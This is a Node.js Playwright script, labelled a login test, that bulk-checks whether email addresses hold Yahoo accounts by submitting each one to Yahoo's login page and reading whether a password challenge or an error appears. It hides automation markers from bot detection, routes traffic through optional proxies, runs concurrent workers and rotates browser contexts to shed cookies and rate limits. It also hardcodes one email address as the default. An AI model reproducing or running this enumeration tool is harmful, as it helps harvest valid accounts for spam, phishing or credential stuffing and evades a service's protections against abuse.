const { chromium, devices } = require('playwright');
const fs = require('fs');

// Usage:
//   node yahoo_login_test.js someone@yahoo.com
//   node yahoo_login_test.js emails.txt
//   CONCURRENCY=10 BATCH=20 RETRIES=1 node yahoo_login_test.js emails.txt

const CONCURRENCY = parseInt(process.env.CONCURRENCY || '5', 10);
const BATCH = parseInt(process.env.BATCH || '20', 10);     // reuse context for N emails, then rotate
const RETRIES = parseInt(process.env.RETRIES || '1', 10);  // retry attempts on FAIL

function loadEmails() {
  const arg = process.argv[2];
  if (process.env.EMAIL) return [process.env.EMAIL];
  if (arg && fs.existsSync(arg)) {
    return fs.readFileSync(arg, 'utf8').split('\n').map(s => s.trim()).filter(Boolean);
  }
  return [arg || 'xadrbithethankmo@yahoo.com'];
}

async function newContext(browser) {
  const context = await browser.newContext({
    ...devices['Desktop Chrome'],
    ignoreHTTPSErrors: true,
    userAgent:
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    locale: 'en-US',
  });
  await context.route('**/*', (route) => {
    const type = route.request().resourceType();
    if (['image', 'media', 'font', 'stylesheet'].includes(type)) return route.abort();
    route.continue();
  });
  await context.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
  });
  return context;
}

async function checkOnPage(page, email) {
  const t0 = Date.now();
  let result = 'UNKNOWN';
  let detail = '';
  try {
    await page.goto('https://login.yahoo.com/', { waitUntil: 'domcontentloaded', timeout: 30000 });
    await page.waitForSelector('input[name="username"], #login-username', { timeout: 15000 });
    await page.fill('input[name="username"], #login-username', email);

    await Promise.all([
      Promise.race([
        page.waitForURL(/challenge\/password|\/account\/challenge/, { timeout: 12000 }).then(() => (result = 'EXISTS')),
        page.waitForSelector('#username-error', { state: 'visible', timeout: 12000 }).then(async (el) => {
          detail = (await el.innerText()).trim();
          if (/don'?t recognize|not recognize|no account|invalid/i.test(detail)) result = 'NOT_FOUND';
          else result = 'ERROR';
        }),
      ]).catch(() => {}),
      page.click('#login-signin, button[name="signin"], button[type="submit"]').catch(() => page.keyboard.press('Enter')),
    ]);

    if (result === 'UNKNOWN') {
      await page.waitForTimeout(800);
      if (/password|challenge/i.test(page.url())) result = 'EXISTS';
      const err = await page.$('#username-error');
      if (err && await err.isVisible()) {
        detail = (await err.innerText()).trim();
        if (/don'?t recognize|not recognize/i.test(detail)) result = 'NOT_FOUND';
      }
    }
  } catch (e) {
    result = 'FAIL';
    detail = e.message.split('\n')[0];
  }
  return { result, detail, ms: Date.now() - t0 };
}

async function worker(browser, workerId, queue, stats) {
  let context = await newContext(browser);
  let page = await context.newPage();
  let used = 0;

  while (queue.length) {
    const email = queue.shift();
    if (!email) break;

    let attempt = 0, r;
    while (attempt <= RETRIES) {
      r = await checkOnPage(page, email);
      if (r.result !== 'FAIL' && r.result !== 'UNKNOWN') break;
      attempt++;
      if (attempt <= RETRIES) {
        // rotate context on retry (fresh cookies)
        await context.close().catch(() => {});
        context = await newContext(browser);
        page = await context.newPage();
        used = 0;
      }
    }

    const line = r.result === 'NOT_FOUND'
      ? `[w${workerId} ${r.ms}ms] ${email} => NOT FOUND`
      : r.result === 'EXISTS'
      ? `[w${workerId} ${r.ms}ms] ${email} => EXISTS`
      : `[w${workerId} ${r.ms}ms] ${email} => ${r.result}${r.detail ? ': ' + r.detail.slice(0, 60) : ''}`;
    console.log(line);
    stats.push({ email, ...r });

    used++;
    if (used >= BATCH) {
      await context.close().catch(() => {});
      context = await newContext(browser);
      page = await context.newPage();
      used = 0;
    }
  }
  await context.close().catch(() => {});
}

(async () => {
  const emails = loadEmails();
  console.log(`[*] ${emails.length} emails | concurrency=${CONCURRENCY} | batch=${BATCH} | retries=${RETRIES}`);

  const browser = await chromium.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-blink-features=AutomationControlled', '--disable-dev-shm-usage', '--disable-gpu'],
    proxy: process.env.PROXY_SERVER
      ? { server: process.env.PROXY_SERVER, username: process.env.PROXY_USER, password: process.env.PROXY_PASS }
      : undefined,
  });

  const queue = emails.slice();
  const stats = [];
  const startAll = Date.now();

  await Promise.all(
    Array.from({ length: CONCURRENCY }, (_, i) => worker(browser, i + 1, queue, stats))
  );

  const totalMs = Date.now() - startAll;
  const exists = stats.filter(s => s.result === 'EXISTS').length;
  const notFound = stats.filter(s => s.result === 'NOT_FOUND').length;
  const failed = stats.filter(s => s.result === 'FAIL' || s.result === 'UNKNOWN' || s.result === 'ERROR').length;

  console.log(`\n--- SUMMARY ---`);
  console.log(`Total: ${emails.length} in ${(totalMs / 1000).toFixed(1)}s`);
  console.log(`Wall avg: ${(totalMs / emails.length).toFixed(0)}ms per check`);
  console.log(`EXISTS: ${exists}  |  NOT_FOUND: ${notFound}  |  FAILED: ${failed}`);

  await browser.close();
})();
